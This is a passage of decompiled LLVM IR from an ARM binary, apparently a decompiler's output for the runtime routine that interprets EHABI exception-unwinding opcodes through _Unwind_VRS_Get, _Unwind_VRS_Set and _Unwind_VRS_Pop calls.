  store i1 %v7_1a050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a050, label %dec_label_pc_1a058, label %dec_label_pc_1a17c

dec_label_pc_1a058:                               ; preds = %dec_label_pc_1a04c
  %v0_1a058 = load i32, i32* @r5, align 4
  %v1_1a058 = add i32 %v0_1a058, 8
  %v2_1a058 = inttoptr i32 %v1_1a058 to i8*
  %v3_1a058 = load i8, i8* %v2_1a058, align 1
  %v4_1a058 = zext i8 %v3_1a058 to i32
  store i32 %v4_1a058, i32* %r3.global-to-local, align 4
  %v2_1a05c = icmp eq i8 %v3_1a058, 0
  store i1 %v2_1a05c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a05c, label %dec_label_pc_1a06c, label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1a058
  %v2_1a060 = add nsw i32 %v4_1a058, -1
  store i32 %v2_1a060, i32* %r3.global-to-local, align 4
  %v2_1a064 = trunc i32 %v2_1a060 to i8
  store i8 %v2_1a064, i8* %v2_1a058, align 1
  %v0_1a068.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a068.pr.pr, label %.thread3.dec_label_pc_1a06c_crit_edge, label %dec_label_pc_1a09c

.thread3.dec_label_pc_1a06c_crit_edge:            ; preds = %.thread3
  %v0_1a06c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %.thread3.dec_label_pc_1a06c_crit_edge, %dec_label_pc_1a058
  %v2_1a080 = phi i32 [ %v0_1a06c.pre, %.thread3.dec_label_pc_1a06c_crit_edge ], [ %v0_1a058, %dec_label_pc_1a058 ]
  %v1_1a06c = add i32 %v2_1a080, 9
  %v2_1a06c = inttoptr i32 %v1_1a06c to i8*
  %v3_1a06c = load i8, i8* %v2_1a06c, align 1
  %v4_1a06c = zext i8 %v3_1a06c to i32
  store i32 %v4_1a06c, i32* %r3.global-to-local, align 4
  %v2_1a070 = icmp eq i8 %v3_1a06c, 0
  store i1 %v2_1a070, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a070, label %dec_label_pc_1a0ac, label %dec_label_pc_1a07c

dec_label_pc_1a07c:                               ; preds = %dec_label_pc_1a06c
  %v1_1a07c = add nsw i32 %v4_1a06c, -1
  store i32 %v1_1a07c, i32* %r3.global-to-local, align 4
  %v1_1a080 = trunc i32 %v1_1a07c to i8
  store i8 %v1_1a080, i8* %v2_1a06c, align 1
  %v0_1a084 = load i32, i32* @r5, align 4
  %v1_1a084 = add i32 %v0_1a084, 4
  %v2_1a084 = inttoptr i32 %v1_1a084 to i32*
  %v3_1a084 = load i32, i32* %v2_1a084, align 4
  store i32 %v3_1a084, i32* %r2.global-to-local, align 4
  %v1_1a088 = inttoptr i32 %v3_1a084 to i32*
  %v2_1a088 = load i32, i32* %v1_1a088, align 4
  store i32 %v2_1a088, i32* %r0.global-to-local, align 4
  %v4_1a088 = add i32 %v3_1a084, 4
  store i32 %v4_1a088, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a088, i32* %v2_1a084, align 4
  %v0_1a094 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a094 = trunc i32 %v0_1a094 to i8
  %v2_1a094 = load i32, i32* @r5, align 4
  %v3_1a094 = add i32 %v2_1a094, 8
  %v4_1a094 = inttoptr i32 %v3_1a094 to i8*
  store i8 %v1_1a094, i8* %v4_1a094, align 1
  %v0_1a098 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a098 = load i32, i32* @r5, align 4
  %v2_1a098 = inttoptr i32 %v1_1a098 to i32*
  store i32 %v0_1a098, i32* %v2_1a098, align 4
  br label %dec_label_pc_1a09c

dec_label_pc_1a09c:                               ; preds = %.thread3, %dec_label_pc_1a07c
  %v0_1a09c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1a09c, i32* %r3.global-to-local, align 4
  %v3_1a0a0 = mul i32 %v0_1a09c, 256
  store i32 %v3_1a0a0, i32* %r0.global-to-local, align 4
  %v1_1a0a4 = load i32, i32* @r5, align 4
  %v2_1a0a4 = inttoptr i32 %v1_1a0a4 to i32*
  store i32 %v3_1a0a0, i32* %v2_1a0a4, align 4
  %v0_1a0a8 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a0a8 = udiv i32 %v0_1a0a8, 16777216
  br label %dec_label_pc_1a0ac

dec_label_pc_1a0ac:                               ; preds = %dec_label_pc_1a06c, %dec_label_pc_1a09c
  %storemerge133 = phi i32 [ %v3_1a0a8, %dec_label_pc_1a09c ], [ 176, %dec_label_pc_1a06c ]
  %v1_1a0ac = load i32, i32* %ip.global-to-local, align 4
  %v4_1a0ac = mul i32 %v1_1a0ac, 256
  %v5_1a0ac = or i32 %v4_1a0ac, %storemerge133
  store i32 %v5_1a0ac, i32* %r2.global-to-local, align 4
  %v7_1a0b0 = icmp eq i32 %v5_1a0ac, 32768
  store i1 %v7_1a0b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a0b0, label %dec_label_pc_1a2bc, label %dec_label_pc_1a0b8

dec_label_pc_1a0b8:                               ; preds = %dec_label_pc_1a0ac
  %v3_1a0b8 = mul i32 %v5_1a0ac, 16
  store i32 %v3_1a0b8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_1a0c8 = and i32 %v3_1a0b8, 65520
  store i32 %v3_1a0c8, i32* %r2.global-to-local, align 4
  %v0_1a0cc = load i32, i32* @r7, align 4
  store i32 %v0_1a0cc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_1a0d4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a0cc, i32 %v3_1a0c8, i32 0, i32 0)
  store i32 %v4_1a0d4, i32* %r0.global-to-local, align 4
  %v2_1a0d8 = icmp eq i32 %v4_1a0d4, 0
  store i1 %v2_1a0d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0d8, label %dec_label_pc_1a0e0, label %dec_label_pc_1a2bc

dec_label_pc_1a0e0:                               ; preds = %dec_label_pc_1a0b8
  %v0_1a0e0 = load i32, i32* @r5, align 4
  %v1_1a0e0 = add i32 %v0_1a0e0, 8
  %v2_1a0e0 = inttoptr i32 %v1_1a0e0 to i8*
  %v3_1a0e0 = load i8, i8* %v2_1a0e0, align 1
  %v4_1a0e0 = zext i8 %v3_1a0e0 to i32
  store i32 %v4_1a0e0, i32* %r3.global-to-local, align 4
  %v0_1a0e4 = load i32, i32* @r4, align 4
  %v1_1a0e4 = and i32 %v0_1a0e4, 32768
  %v2_1a0e4 = icmp eq i32 %v1_1a0e4, 0
  store i1 %v2_1a0e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0e4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_1a0e0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_1a0e0, %bb147
  %v2_1a0ec = icmp eq i8 %v3_1a0e0, 0
  store i1 %v2_1a0ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a0ec, label %dec_label_pc_1a0fc, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_1a0f0 = add nsw i32 %v4_1a0e0, -1
  store i32 %v2_1a0f0, i32* %r3.global-to-local, align 4
  %v2_1a0f4 = trunc i32 %v2_1a0f0 to i8
  store i8 %v2_1a0f4, i8* %v2_1a0e0, align 1
  %v0_1a0f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a0f8.pr.pr, label %.thread6.dec_label_pc_1a0fc_crit_edge, label %dec_label_pc_1a028

.thread6.dec_label_pc_1a0fc_crit_edge:            ; preds = %.thread6
  %v0_1a0fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a0fc

dec_label_pc_1a0fc:                               ; preds = %bb148, %.thread6.dec_label_pc_1a0fc_crit_edge
  %v0_1a0fc = phi i32 [ %v0_1a0fc.pre, %.thread6.dec_label_pc_1a0fc_crit_edge ], [ %v0_1a0e0, %bb148 ]
  %v1_1a0fc = add i32 %v0_1a0fc, 9
  %v2_1a0fc = inttoptr i32 %v1_1a0fc to i8*
  %v3_1a0fc = load i8, i8* %v2_1a0fc, align 1
  %v4_1a0fc = zext i8 %v3_1a0fc to i32
  store i32 %v4_1a0fc, i32* %r3.global-to-local, align 4
  %v2_1a100 = icmp eq i8 %v3_1a0fc, 0
  store i1 %v2_1a100, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a100, label %dec_label_pc_1a108, label %dec_label_pc_1a00c

dec_label_pc_1a108:                               ; preds = %dec_label_pc_1a0fc, %dec_label_pc_1a000, %dec_label_pc_1a028
  %v0_1a108 = load i32, i32* @sl, align 4
  %v2_1a108 = icmp eq i32 %v0_1a108, 0
  store i1 %v2_1a108, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a108, label %dec_label_pc_1a1d0, label %bb149

bb149:                                            ; preds = %dec_label_pc_1a108
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a114:                               ; preds = %bb149, %dec_label_pc_1a684, %dec_label_pc_1a524, %dec_label_pc_1a348, %dec_label_pc_1a300, %dec_label_pc_1a2bc, %dec_label_pc_1a1d0
  %v1_1a11c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_1a684 ], [ 9, %dec_label_pc_1a524 ], [ 9, %dec_label_pc_1a348 ], [ 9, %dec_label_pc_1a300 ], [ 9, %dec_label_pc_1a2bc ], [ %v0_1a204, %dec_label_pc_1a1d0 ]
  store i32 %v9_19fd8, i32* %r6.global-to-local, align 4
  store i32 %v21_19fd8, i32* @lr, align 4
  ret i32 %v1_1a11c

dec_label_pc_1a120:                               ; preds = %dec_label_pc_1a044
  %v1_1a120 = mul i32 %v0_1a044, 4
  %v3_1a124 = and i32 %v1_1a120, 252
  store i32 %v3_1a124, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a130 = load i32, i32* @r7, align 4
  store i32 %v0_1a130, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_1a138 = add nuw nsw i32 %v3_1a124, 4
  store i32 %v1_1a138, i32* %r6.global-to-local, align 4
  %v5_1a140 = call i32 @_Unwind_VRS_Get(i32 %v0_1a130, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_1a144 = load i32, i32* @r4, align 4
  %v1_1a144 = and i32 %v0_1a144, 64
  %v2_1a144 = icmp eq i32 %v1_1a144, 0
  store i1 %v2_1a144, i1* %cpsr_z.global-to-local, align 1
  %v4_1a14c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_1a158 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_1a158
  %storemerge160.p = select i1 %v2_1a144, i32 %v2_1a158, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1a14c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_1a174 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a174, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fec.backedge

dec_label_pc_19fec.backedge:                      ; preds = %dec_label_pc_1a120, %dec_label_pc_1a19c, %dec_label_pc_1a620, %dec_label_pc_1a2ec, %dec_label_pc_1a324, %dec_label_pc_1a2a4, %dec_label_pc_1a510
  %v0_19fec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19fec

dec_label_pc_1a17c:                               ; preds = %dec_label_pc_1a04c
  %v7_1a17c = icmp eq i32 %v1_1a04c, 144
  store i1 %v7_1a17c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a17c, label %dec_label_pc_1a184, label %dec_label_pc_1a2c4

dec_label_pc_1a184:                               ; preds = %dec_label_pc_1a17c
  %v1_1a184 = urem i32 %v0_1a044, 16
  store i32 %v1_1a184, i32* %r2.global-to-local, align 4
  %v2_1a188 = icmp eq i32 %v1_1a184, 15
  store i1 %v2_1a188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a188, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_1a184
  %v8_1a18c = icmp eq i32 %v1_1a184, 13
  store i1 %v8_1a18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1a18c, label %bb154, label %dec_label_pc_1a19c

.thread21:                                        ; preds = %dec_label_pc_1a184
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a2bc

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a2bc

dec_label_pc_1a19c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a1a8 = load i32, i32* @r7, align 4
  store i32 %v0_1a1a8, i32* %r0.global-to-local, align 4
  %v5_1a1b0 = call i32 @_Unwind_VRS_Get(i32 %v0_1a1a8, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a1b8 = load i32, i32* @r7, align 4
  store i32 %v0_1a1b8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_1a1c8 = call i32 @_Unwind_VRS_Set(i32 %v0_1a1b8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a1c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fec.backedge

dec_label_pc_1a1d0:                               ; preds = %dec_label_pc_1a108
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a1e0 = load i32, i32* @r7, align 4
  store i32 %v0_1a1e0, i32* %r0.global-to-local, align 4
  %v7_1a1e8 = call i32 @_Unwind_VRS_Get(i32 %v0_1a1e0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1a1ec = load i32, i32* @r7, align 4
  store i32 %v0_1a1ec, i32* %r0.global-to-local, align 4
  %v0_1a1f0 = load i32, i32* @sl, align 4
  store i32 %v0_1a1f0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_1a1f0, i32* %r3.global-to-local, align 4
  %v5_1a200 = call i32 @_Unwind_VRS_Set(i32 %v0_1a1ec, i32 %v0_1a1f0, i32 15, i32 %v0_1a1f0, i8* bitcast (i32* @0 to i8*))
  %v0_1a204 = load i32, i32* @sl, align 4
  store i32 %v0_1a204, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a20c:                               ; preds = %dec_label_pc_1a400
  %v7_1a20c = icmp eq i32 %v0_1a400, 199
  store i1 %v7_1a20c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a20c, label %dec_label_pc_1a4e0, label %dec_label_pc_1a214

dec_label_pc_1a214:                               ; preds = %dec_label_pc_1a20c
  %v1_1a214 = and i32 %v0_1a044, 248
  store i32 %v1_1a214, i32* %r3.global-to-local, align 4
  %v7_1a218 = icmp eq i32 %v1_1a214, 192
  store i1 %v7_1a218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a218, label %.thread24, label %dec_label_pc_1a230

.thread24:                                        ; preds = %dec_label_pc_1a214
  %v2_1a21c = urem i32 %v0_1a044, 16
  %v2_1a220 = add nuw nsw i32 %v2_1a21c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_1a228 = or i32 %v2_1a220, 655360
  store i32 %v2_1a228, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a230:                               ; preds = %dec_label_pc_1a214
  %v7_1a230 = icmp eq i32 %v0_1a400, 200
  store i1 %v7_1a230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a230, label %dec_label_pc_1a474, label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a230
  %v7_1a238 = icmp eq i32 %v0_1a400, 201
  store i1 %v7_1a238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a238, label %dec_label_pc_1a240, label %dec_label_pc_1a2bc

dec_label_pc_1a240:                               ; preds = %dec_label_pc_1a238
  %v0_1a240 = load i32, i32* @r5, align 4
  %v1_1a240 = add i32 %v0_1a240, 8
  %v2_1a240 = inttoptr i32 %v1_1a240 to i8*
  %v3_1a240 = load i8, i8* %v2_1a240, align 1
  %v4_1a240 = zext i8 %v3_1a240 to i32
  store i32 %v4_1a240, i32* %r3.global-to-local, align 4
  %v2_1a244 = icmp eq i8 %v3_1a240, 0
  store i1 %v2_1a244, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a244, label %dec_label_pc_1a254, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_1a240
  %v2_1a248 = add nsw i32 %v4_1a240, -1
  store i32 %v2_1a248, i32* %r3.global-to-local, align 4
  %v2_1a24c = trunc i32 %v2_1a248 to i8
  store i8 %v2_1a24c, i8* %v2_1a240, align 1
  %v0_1a250.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a250.pr.pr, label %.thread26.dec_label_pc_1a254_crit_edge, label %dec_label_pc_1a288

.thread26.dec_label_pc_1a254_crit_edge:           ; preds = %.thread26
  %v0_1a254.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a254

dec_label_pc_1a254:                               ; preds = %.thread26.dec_label_pc_1a254_crit_edge, %dec_label_pc_1a240
  %v2_1a26c = phi i32 [ %v0_1a254.pre, %.thread26.dec_label_pc_1a254_crit_edge ], [ %v0_1a240, %dec_label_pc_1a240 ]
  %v1_1a254 = add i32 %v2_1a26c, 9
  %v2_1a254 = inttoptr i32 %v1_1a254 to i8*
  %v3_1a254 = load i8, i8* %v2_1a254, align 1
  %v4_1a254 = zext i8 %v3_1a254 to i32
  store i32 %v4_1a254, i32* %r3.global-to-local, align 4
  %v2_1a258 = icmp eq i8 %v3_1a254, 0
  store i1 %v2_1a258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a258, label %dec_label_pc_1a2a4, label %dec_label_pc_1a268

dec_label_pc_1a268:                               ; preds = %dec_label_pc_1a254
  %v1_1a268 = add nsw i32 %v4_1a254, -1
  store i32 %v1_1a268, i32* %r3.global-to-local, align 4
  %v1_1a26c = trunc i32 %v1_1a268 to i8
  store i8 %v1_1a26c, i8* %v2_1a254, align 1
  %v0_1a270 = load i32, i32* @r5, align 4
  %v1_1a270 = add i32 %v0_1a270, 4
  %v2_1a270 = inttoptr i32 %v1_1a270 to i32*
  %v3_1a270 = load i32, i32* %v2_1a270, align 4
  store i32 %v3_1a270, i32* %r2.global-to-local, align 4
  %v1_1a274 = inttoptr i32 %v3_1a270 to i32*
  %v2_1a274 = load i32, i32* %v1_1a274, align 4
  store i32 %v2_1a274, i32* %r0.global-to-local, align 4
  %v4_1a274 = add i32 %v3_1a270, 4
  store i32 %v4_1a274, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a274, i32* %v2_1a270, align 4
  %v0_1a280 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a280 = trunc i32 %v0_1a280 to i8
  %v2_1a280 = load i32, i32* @r5, align 4
  %v3_1a280 = add i32 %v2_1a280, 8
  %v4_1a280 = inttoptr i32 %v3_1a280 to i8*
  store i8 %v1_1a280, i8* %v4_1a280, align 1
  %v0_1a284 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a284 = load i32, i32* @r5, align 4
  %v2_1a284 = inttoptr i32 %v1_1a284 to i32*
  store i32 %v0_1a284, i32* %v2_1a284, align 4
  br label %dec_label_pc_1a288

dec_label_pc_1a288:                               ; preds = %.thread26, %dec_label_pc_1a268
  %v0_1a288 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a288 = udiv i32 %v0_1a288, 16777216
  %v1_1a28c = urem i32 %v3_1a288, 16
  %v3_1a290 = mul i32 %v0_1a288, 256
  %v1_1a294 = add nuw nsw i32 %v1_1a28c, 1
  store i32 %v1_1a294, i32* %r1.global-to-local, align 4
  %v1_1a298 = and i32 %v3_1a288, 240
  store i32 %v1_1a298, i32* %r3.global-to-local, align 4
  %v1_1a29c = load i32, i32* @r5, align 4
  %v2_1a29c = inttoptr i32 %v1_1a29c to i32*
  store i32 %v3_1a290, i32* %v2_1a29c, align 4
  %v0_1a2a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a2a0 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a2a0 = mul i32 %v1_1a2a0, 4096
  %v5_1a2a0 = or i32 %v4_1a2a0, %v0_1a2a0
  br label %dec_label_pc_1a2a4

dec_label_pc_1a2a4:                               ; preds = %dec_label_pc_1a254, %dec_label_pc_1a288
  %storemerge = phi i32 [ %v5_1a2a0, %dec_label_pc_1a288 ], [ 720897, %dec_label_pc_1a254 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_1a2a4 = load i32, i32* @r7, align 4
  store i32 %v0_1a2a4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a2b0 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a2a4, i32 1, i32 5, i32 5)
  store i32 %v4_1a2b0, i32* %r0.global-to-local, align 4
  %v2_1a2b4 = icmp eq i32 %v4_1a2b0, 0
  store i1 %v2_1a2b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2b4, label %dec_label_pc_19fec.backedge, label %dec_label_pc_1a2bc

dec_label_pc_1a2bc:                               ; preds = %dec_label_pc_1a508, %dec_label_pc_1a238, %dec_label_pc_1a318, %dec_label_pc_1a6bc, %dec_label_pc_1a68c, %dec_label_pc_1a668, %dec_label_pc_1a4f4, %dec_label_pc_1a2a4, %dec_label_pc_1a0b8, %dec_label_pc_1a0ac, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a2c4:                               ; preds = %dec_label_pc_1a17c
  %v7_1a2c4 = icmp eq i32 %v1_1a04c, 160
  store i1 %v7_1a2c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a2c4, label %dec_label_pc_1a2cc, label %dec_label_pc_1a308

dec_label_pc_1a2cc:                               ; preds = %dec_label_pc_1a2c4
  %v0_1a2cc = load i32, i32* %ip.global-to-local, align 4
  %v1_1a2cc = urem i32 %v0_1a2cc, 8
  %v1_1a2d0 = xor i32 %v1_1a2cc, 7
  store i32 %v1_1a2d0, i32* %r3.global-to-local, align 4
  %v6_1a2d8 = lshr i32 4080, %v1_1a2d0
  %v1_1a2dc = and i32 %v0_1a044, 8
  %v2_1a2dc = icmp eq i32 %v1_1a2dc, 0
  store i1 %v2_1a2dc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2e0 = and i32 %v6_1a2d8, 4080
  %tmp155 = mul nuw nsw i32 %v1_1a2dc, 2048
  %tmp156 = or i32 %v1_1a2e0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ec

dec_label_pc_1a2ec:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1a67c.dec_label_pc_1a2ec_crit_edge, %bb157, %dec_label_pc_1a4d8, %dec_label_pc_1a46c, %dec_label_pc_1a3cc, %dec_label_pc_1a2cc
  %v2_1a2f4 = phi i32 [ %v2_1a3f0, %.thread44 ], [ %v2_1a3f8, %bb157 ], [ %v2_1a2f4.pre, %dec_label_pc_1a67c.dec_label_pc_1a2ec_crit_edge ], [ %v2_1a228, %.thread24 ], [ %storemerge130, %dec_label_pc_1a4d8 ], [ %storemerge131, %dec_label_pc_1a46c ], [ %storemerge132, %dec_label_pc_1a3cc ], [ %tmp156, %dec_label_pc_1a2cc ]
  %v0_1a2f0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1a67c.dec_label_pc_1a2ec_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_1a4d8 ], [ 3, %dec_label_pc_1a46c ], [ 1, %dec_label_pc_1a3cc ], [ 0, %dec_label_pc_1a2cc ]
  %v0_1a2ec = load i32, i32* @r7, align 4
  store i32 %v0_1a2ec, i32* %r0.global-to-local, align 4
  store i32 %v0_1a2f0, i32* %r3.global-to-local, align 4
  %v4_1a2f4 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a2ec, i32 %v0_1a2f0, i32 %v2_1a2f4, i32 %v0_1a2f0)
  store i32 %v4_1a2f4, i32* %r0.global-to-local, align 4
  %v2_1a2f8 = icmp eq i32 %v4_1a2f4, 0
  store i1 %v2_1a2f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2f8, label %dec_label_pc_19fec.backedge, label %dec_label_pc_1a300

dec_label_pc_1a300:                               ; preds = %dec_label_pc_1a2ec
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a308:                               ; preds = %dec_label_pc_1a2c4
  %v7_1a308 = icmp eq i32 %v1_1a04c, 176
  store i1 %v7_1a308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a308, label %dec_label_pc_1a350, label %dec_label_pc_1a310

dec_label_pc_1a310:                               ; preds = %dec_label_pc_1a308
  %v7_1a310 = icmp eq i32 %v1_1a04c, 192
  store i1 %v7_1a310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a310, label %dec_label_pc_1a400, label %dec_label_pc_1a318

dec_label_pc_1a318:                               ; preds = %dec_label_pc_1a310
  %v1_1a318 = and i32 %v0_1a044, 248
  store i32 %v1_1a318, i32* %r3.global-to-local, align 4
  %v7_1a31c = icmp eq i32 %v1_1a318, 208
  store i1 %v7_1a31c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a31c, label %dec_label_pc_1a324, label %dec_label_pc_1a2bc

dec_label_pc_1a324:                               ; preds = %dec_label_pc_1a318
  %v1_1a324 = urem i32 %v0_1a044, 8
  %v1_1a328 = add nuw nsw i32 %v1_1a324, 1
  %v1_1a32c = or i32 %v1_1a328, 524288
  store i32 %v1_1a32c, i32* %r2.global-to-local, align 4
  %v0_1a330 = load i32, i32* @r7, align 4
  store i32 %v0_1a330, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1a33c = call i32 @_Unwind_VRS_Pop(i32 %v0_1a330, i32 1, i32 %v1_1a32c, i32 5)
  store i32 %v4_1a33c, i32* %r0.global-to-local, align 4
  %v2_1a340 = icmp eq i32 %v4_1a33c, 0
  store i1 %v2_1a340, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a340, label %dec_label_pc_19fec.backedge, label %dec_label_pc_1a348

dec_label_pc_1a348:                               ; preds = %dec_label_pc_1a324
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a114

dec_label_pc_1a350:                               ; preds = %dec_label_pc_1a308
  %v0_1a350 = load i32, i32* %ip.global-to-local, align 4
  %v7_1a350 = icmp eq i32 %v0_1a350, 177
  store i1 %v7_1a350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a350, label %dec_label_pc_1a654, label %dec_label_pc_1a358

dec_label_pc_1a358:                               ; preds = %dec_label_pc_1a350
  %v7_1a358 = icmp eq i32 %v0_1a350, 178
  store i1 %v7_1a358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a358, label %dec_label_pc_1a52c, label %dec_label_pc_1a360

dec_label_pc_1a360:                               ; preds = %dec_label_pc_1a358
  %v7_1a360 = icmp eq i32 %v0_1a350, 179
  store i1 %v7_1a360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a360, label %dec_label_pc_1a368, label %dec_label_pc_1a3d4

dec_label_pc_1a368:                               ; preds = %dec_label_pc_1a360
  %v0_1a368 = load i32, i32* @r5, align 4
  %v1_1a368 = add i32 %v0_1a368, 8
  %v2_1a368 = inttoptr i32 %v1_1a368 to i8*
  %v3_1a368 = load i8, i8* %v2_1a368, align 1
  %v4_1a368 = zext i8 %v3_1a368 to i32
  store i32 %v4_1a368, i32* %r3.global-to-local, align 4
  %v2_1a36c = icmp eq i8 %v3_1a368, 0
  store i1 %v2_1a36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a36c, label %dec_label_pc_1a37c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_1a368
  %v2_1a370 = add nsw i32 %v4_1a368, -1
  store i32 %v2_1a370, i32* %r3.global-to-local, align 4
  %v2_1a374 = trunc i32 %v2_1a370 to i8
  store i8 %v2_1a374, i8* %v2_1a368, align 1
  %v0_1a378.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a378.pr.pr, label %.thread30.dec_label_pc_1a37c_crit_edge, label %dec_label_pc_1a3b0

.thread30.dec_label_pc_1a37c_crit_edge:           ; preds = %.thread30
  %v0_1a37c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a37c

